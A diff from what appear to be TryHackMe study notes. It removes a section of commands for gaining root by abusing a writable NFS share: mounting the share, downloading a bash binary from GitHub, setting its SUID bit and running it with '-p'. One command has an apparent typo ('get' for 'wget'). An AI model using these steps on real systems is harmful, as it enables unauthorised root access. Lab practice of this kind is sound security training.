@@ -325,51 +325,6 @@ remotes into IP
 **Then connecting via RDP, use THM\Administrator as the username to specify you want to log in using the user Administrator on the THM domain.**
 
 
-# NFS Share Reverse Shell
-
-1. step one
-
-    ```
-     showmount -e [IP]
-    ```
-    shows visible NFS shares on that IP 
-
-2. Step Two
-
-    ```
-    sudo mount -t nfs IP:share /tmp/mount/ -nolock
-    ```
-    mounts the share from "IP:share" to the directory "/tmp/mount"
-
-3. Step Three
-    Download Bash executable
-    ```
-    get https://github.com/polo-sec/writing/raw/master/Security%20Challenge%20Walkthroughs/Networks%202/bash -P ~/Downloads
-    ```
-4. Step Four
-
-    ```
-    cp ~/Downloads/bash ~/share
-    ```
-    Copy it to the NFS mount point
-
-5. Step Five
-
-    Change its permissions
-    ```
-    sudo chmod +s bash
-    sudo chmod +x bash
-    file should have "-rwsr-sr-x" as permissions
-    ```
-6. Step Six
-    ssh into the machine that now holds the bash executable
-    run the executable using
-	```
-    ./bash -p
-    ```
->You should now have a shell as "root"
-
-
 
 ---
 
